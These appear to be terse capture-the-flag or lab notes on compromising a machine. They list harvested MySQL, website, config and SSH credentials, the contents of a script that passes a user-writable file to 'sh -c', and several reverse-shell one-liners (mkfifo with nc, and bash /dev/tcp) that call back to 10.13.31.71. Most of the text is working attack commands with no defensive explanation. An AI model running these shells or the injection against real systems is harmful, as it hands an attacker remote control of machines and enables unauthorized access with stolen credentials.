Found credentials to access the mysql data base:

root:rockyou

Found credentials in the users table for the website:

Adrian:tigger

Found another credentials in the config file:

adrian:P@sswr0d789!

[rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.31.71 1234 >/tmp/f](rm+-f+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2%3E%261|nc+10.13.31.71+1234+>/tmp/f)

Adrian's SSH credentials:

adrian:theettubrute!

punch_in.sh contents:

```
#!/bin/bash

/usr/bin/echo 'Punched in at '$(/usr/bin/date +"%H:%M") >> /home/adrian/punch_in
```

script contents:

```
#!/bin/sh
while read line;
do
  /usr/bin/sh -c "echo $line";
done < /home/adrian/punch_in
```

Script I wanna execute:

```
#!/bin/bash
bash -i >& /dev/tcp/10.13.31.71/6666 0>&1
```

`rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.31.71 6666 >/tmp/f`